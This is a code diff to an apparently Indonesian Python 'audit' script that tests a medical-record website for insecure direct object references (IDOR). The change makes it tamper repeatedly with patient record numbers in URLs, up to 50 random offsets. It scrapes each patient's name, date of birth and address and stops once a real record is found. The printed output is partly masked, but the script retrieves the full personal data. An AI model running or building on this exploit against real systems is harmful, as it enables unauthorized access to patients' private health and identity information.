@@ -180,66 +180,60 @@ def parameter_discovery_audit():
                         print("[!] URL ini tidak memiliki parameter ID (No RM) untuk dimanipulasi.")
                         continue
 
-                    # 1. Masking digit ke-3 dari belakang untuk PoC Target (Contoh: *****0**)
+                    # 1. Tampilkan Target Awal (Masking digit ke-3 dari belakang)
                     poc_mask = "*" * (len(original_id) - 3) + original_id[-3] + "**"
                     print(f"\n[*] Target Selected: {base_url.replace(original_id, poc_mask)}")
                     
                     # 2. Automated Manipulation Test
-                    print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
+                    print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
-                    # Generate ID baru dengan offset acak
-                    offset = random.choice([x for x in range(-50, 51) if x != 0])
-                    test_id = str(int(original_id) + offset).zfill(len(original_id))
-                    test_url = base_url.replace(original_id, test_id)
+                    found_valid = False
+                    max_attempts = 50 # Mencoba hingga 50 kali untuk menemukan data valid
                     
-                    test_res = session.get(test_url, timeout=10)
-                    test_soup = BeautifulSoup(test_res.text, 'html.parser')
-                    
-                    # Masking No RM untuk hasil audit
-                    result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
-                    
-                    name_tag = test_soup.find('p', class_='sale-price text-success')
-                    # Parsing Data secara lebih luas
-                    name = "Unknown"
-                    address = "Tidak Ditemukan"
-                    
-                    # Ekstraksi Alamat dari detail tag
-                    details = test_soup.find_all('p', class_='detail')
-                    for p in details:
-                        if "Alamat" in p.get_text():
-                            address = p.get_text().split(":")[-1].strip()
+                    for attempt in range(1, max_attempts + 1):
+                        offset = random.randint(-300, 300)
+                        test_id = str(int(original_id) + offset).zfill(len(original_id))
+                        test_url = base_url.replace(original_id, test_id)
+                        
+                        # Heartbeat pencarian
+                        print(f"    [Attempt {attempt}] Testing ID: {'*'*(len(test_id)-3)+test_id[-3:]}", end='\r')
+                        
+                        test_res = session.get(test_url, timeout=10)
+                        test_soup = BeautifulSoup(test_res.text, 'html.parser')
+                        
+                        # Inisialisasi Data
+                        name, dob, address = "Unknown", "Tidak Ditemukan", "Tidak Ditemukan"
+                        
+                        # Ekstraksi Data secara Agresif
+                        for tag in test_soup.find_all(['p', 'td', 'li', 'span']):
+                            txt = tag.get_text(" ", strip=True)
+                            if ":" in txt:
+                                parts = txt.split(":", 1)
+                                key, val = parts[0].lower(), parts[1].strip()
+                                if "nama" in key: name = val
+                                elif "lahir" in key: dob = val
+                                elif "alamat" in key: address = val
+                        
+                        # Validasi: Jika nama dan alamat ditemukan, hentikan pencarian
+                        if name != "Unknown" and address != "Tidak Ditemukan":
+                            found_valid = True
+                            result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
+                            
+                            # Masking 3 depan ... 3 belakang
+                            m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name.upper()
+                            m_dob  = f"{dob[:3]}...{dob[-3:]}" if len(dob) > 6 else dob
+                            m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address.upper()
+
+                            print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                            print(f" [!] No. RM      : {result_mask}")
+                            print(f" [!] Nama        : {m_name}")
+                            print(f" [!] Tgl Lahir   : {m_dob}")
+                            print(f" [!] Alamat      : {m_addr}")
+                            print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
                             break
-                    # Cari Nama (berdasarkan class umum atau label)
-                    name_tag = test_soup.find('p', class_='sale-price')
-                    if name_tag:
-                        name = name_tag.get_text(strip=True).replace("Nama Pasien :", "").strip()
-
-                    if name_tag or address != "Tidak Ditemukan":
-                        name = name_tag.get_text(strip=True) if name_tag else "Unknown"
-                    # Scan seluruh elemen untuk mencari label Alamat dan Nama jika belum ketemu
-                    for tag in test_soup.find_all(['p', 'td', 'div', 'li']):
-                        txt = tag.get_text(strip=True)
-                        if "Alamat" in txt and ":" in txt:
-                            address = txt.split(":", 1)[-1].strip()
-                        if name == "Unknown" and "Nama" in txt and ":" in txt:
-                            name = txt.split(":", 1)[-1].strip()
-
-                    # Masking No RM untuk tampilan
-                    result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
-
-                    if name != "Unknown" or address != "Tidak Ditemukan":
-                        # Masking 3 depan ... 3 belakang
-                        m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name
-                        m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address
-
-                        print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                        print(f" [!] Manipulated ID  : {result_mask}")
-                        print(f" [!] Discovered Name: {m_name}")
-                        print(f" [!] Discovered Addr: {m_addr}")
-                        print(f" [!] Vulnerability   : \033[91mIDOR Confirmed\033[0m")
-                    else:
-                        print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {result_mask}.")
-                        print(f" [!] Result         : No data extracted (Status: {test_res.status_code})")
+                    
+                    if not found_valid:
+                        print(f"\n[\033[93m!\033[0m] Discovery Failed: No valid records found in range after {max_attempts} attempts.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
